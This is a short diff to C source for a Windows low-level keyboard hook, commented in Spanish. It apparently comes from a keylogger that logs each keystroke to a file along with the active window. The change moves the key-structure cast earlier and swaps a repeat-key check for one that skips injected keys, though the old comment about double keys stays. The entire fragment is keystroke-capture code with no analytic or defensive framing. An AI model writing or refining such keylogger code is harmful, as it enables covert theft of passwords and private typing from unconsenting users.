@@ -24,10 +24,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     // Variable estatica para recordar la ultima ventana activa (Handle to windows)
     static HWND lastHwnd = NULL;
 
+    // Procesar y escribir la tecla
+    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+    DWORD vkCode = p->vkCode;  // Código virtual de la tecla
+
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
 
         // filtro para teclas dobles
-        if ((lParam & (1 << 30)) != 0) {
+        if (p->flags & LLKHF_INJECTED) {
             return CallNextHookEx(g_hHook, nCode, wParam, lParam);
         }
 
@@ -59,10 +63,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(
                 fflush(logFile);
             }
         }
-
-        // Procesar y escribir la tecla
-        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
-        DWORD vkCode = p->vkCode;  // Código virtual de la tecla
 
         // --- INICIO DE LA MODIFICACIÓN ---
         // Obtener el HILO de la ventana activa para saber su distribución de teclado
